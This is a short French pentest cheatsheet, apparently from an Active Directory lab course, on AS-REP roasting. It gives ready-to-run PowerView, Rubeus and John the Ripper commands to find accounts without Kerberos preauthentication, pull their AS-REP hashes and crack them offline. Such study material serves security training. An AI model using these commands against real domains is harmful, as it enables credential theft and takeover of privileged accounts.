# Cheatsheet - AS-REP Roasting

> [!summary] Objectif
> Repérer les comptes sans préauth (`DoesNotRequirePreAuth`), récupérer l'AS-REP et le cracker offline. Workflow court : enumerate → request → crack.

### Find vulnerable accounts

> Permet d'obtenir un hash crackable pour ce compte **sans jamais s'authentifier au préalable** ni connaître le moindre secret : le KDC renvoie l'AS-REP chiffré à quiconque le demande. Si le compte cible a des privilèges (DA), un crack réussi donne l'accès complet, gratuitement.

> [!warning]- Required
> Un nom d'utilisateur candidat avec préauth désactivée — c'est tout : contrairement au Kerberoasting, aucun compte de domaine valide n'est nécessaire pour lancer la requête elle-même.

```powershell
. C:\AD\Tools\PowerView.ps1
Get-DomainUser -PreauthNotRequired -Verbose
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
```

### Request AS-REP

```powershell
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args asreproast /user:VPN1user /outfile:C:\AD\Tools\asrephashes.txt
```

### Crack

```powershell
C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe -wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\asrephashes.txt
```

## Related
[[Cheatsheet - Kerberoasting]] · [[Synthèse - Kerberos]] · [[Attaques AD - MOC]]
